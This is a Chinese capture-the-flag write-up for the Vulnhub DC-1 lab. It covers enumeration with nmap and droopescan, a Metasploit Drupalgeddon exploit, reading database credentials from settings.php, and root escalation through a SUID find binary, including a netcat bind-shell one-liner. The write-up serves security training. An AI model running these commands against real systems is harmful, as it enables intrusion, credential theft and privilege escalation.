---
title: DC-1
tags:
  - Vulnhub
  - DC-1
categories: 
  - 渗透靶机训练
description: Vulnhub DC-1 Challenge
excerpt: Vulnhub DC-1 Challenge
typora-root-url: DC-1
abbrlink: 41017
date: 2021-03-22 23:03:16
---

# DC-1

> 下载的虚拟机文件导入后在我的VMWare上并未网络问题，如有问题参考文章：[Fix Network Problem In Vulnhub Virtual Machine](https://evalexp.gitee.io/blog/p/38372/)

本挑战共有五枚FLAG。

## FLAG 1

使用**nmap**扫描一下服务器：

```bash
nmap -sC -sV -A -p- 192.168.145.134
```

得到以下结果：

![image-20210322230854178](image-20210322230854178.png)

结果存档备用。

可以看到nmap扫描的结果暴露了许多信息，这是一个**Drupal**的站，其次网站根目录下有**robots.txt**文件。

使用**nikto**扫描一下目标网站：

```bash
nikto -h 192.168.145.134
```

![image-20210322231145150](image-20210322231145150.png)

拿到的信息十分有限，唯一有用的信息就是之前已经知道的**Drupal 7.x**，至于其它看起来十分像敏感信息的经测试并无太大用处。

既然是CMS，那么就看看它有无已经披露的漏洞吧：

```bash
searchsploit Drupal 7
```

![image-20210322231445033](image-20210322231445033.png)

注意到部分**Metasploit**可渗透，在msf中搜索Drupal：

![image-20210322231821679](image-20210322231821679.png)

然后我们需要确定CMS的准确版本，或者获取一个模糊的版本区间，不能只是模糊的7.x。

经Google，发现了工具**droopescan**，其GitHub地址为：[https://github.com/droope/droopescan](https://github.com/droope/droopescan)

将其克隆至本地：

```bash
git clone https://github.com/droope/droopescan.git
```

然后安装依赖：

```bash
pip install -r requirements.txt
```

完成后执行：

```bash
./droopescan
```

出现异常：

![image-20210322232800319](image-20210322232800319.png)

使用pip排查，依赖已全部安装，修改执行python版本：

```bash
vim ./droopescan
```

修改为：

![image-20210322232901344](image-20210322232901344.png)

运行成功：

![image-20210322232930625](image-20210322232930625.png)

使用该工具扫描目标网站：

```bash
./droopescan scan drupal -u 192.168.145.134 -t 16
```

扫描结果：

![image-20210322233150978](image-20210322233150978.png)

可以确定目标版本，查看**searchsploit**命令的结果，发现7.x的漏洞几乎都可利用，加载**exploit\/multi\/http\/drupal_drupageddon**或者**exploit\/unix\/webapp\/drupal_drupalgeddon2**，然后拿到shell：

![image-20210322233814504](image-20210322233814504.png)

获取交互式shell：

```
shell
/bin/bash -i
```

![image-20210322233858934](image-20210322233858934.png)

成功拿到第一枚Flag：

![image-20210322233925233](image-20210322233925233.png)

## FLAG 2

根据FLAG1的提示，找Drupal的配置文件。

Drupal的配置文件位于：

```conf
/var/www/sites/default/settings.php
```

使用less仔细查看：

```bash
cat settings.php | less
```

发现使用bash -i获取的交互式环境有点问题，换python获取交互式shell，在meterpreter拿到shell后，执行：

```bash
python -c 'import pty; pty.spawn("/bin/bash");'
```

再次仔细查看：

![image-20210322234421423](image-20210322234421423.png)

第二枚FLAG。

发现了数据库账号和密码，保持留用。

## FLAG 3

连上数据库看看：

```bash
mysql -udbuser -pR0ck3t
```

数据库：

![image-20210322234657713](image-20210322234657713.png)

表共80个，此处不列出了。

有个比较关键的**users**表，查询其信息，得到了两个用户的信息，密码是经过Hash的，比较难处理。

在node表中查到第三枚Flag，但是不能算Flag，因为其内容没有一起存储在node表中，我们继续找找，最终在表**field_data_body**中找到了Flag3：

![image-20210322235034279](image-20210322235034279.png)

## FLAG 4

使用Find命令找到第四枚Flag。

![image-20210322235904518](image-20210322235904518.png)

## FLAG 5

按提示尝试进入/root失败：

![image-20210322235943415](image-20210322235943415.png)

按照Flag3的提示，用find找具有特殊权限suid的命令：

![image-20210323000531653](image-20210323000531653.png)

发现find是所属于root的，既然无法进入该目录，使用find遍历/root试试：

![image-20210323000746889](image-20210323000746889.png)

最终的flag出现了。

现在我们就要想办法拿到这个文件的内容。

这里需要提权，记录一下发现Linux运行的所有SUID可执行文件：

```bash
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
```

发现find具有SUID标识：

![image-20210323001859908](image-20210323001859908.png)

查看一下：

![image-20210323001932318](image-20210323001932318.png)

使用find提权：

```bash
# Method 1
find . -exec '/bin/sh' \;

# Method 2
touch $filename
find $filename -exec netcat -lvp 5555 -e /bin/sh \;
# Then use netcat to connect the server
```

此处使用第一个方法，成功拿到最终的FLAG。

![image-20210323002932191](image-20210323002932191.png)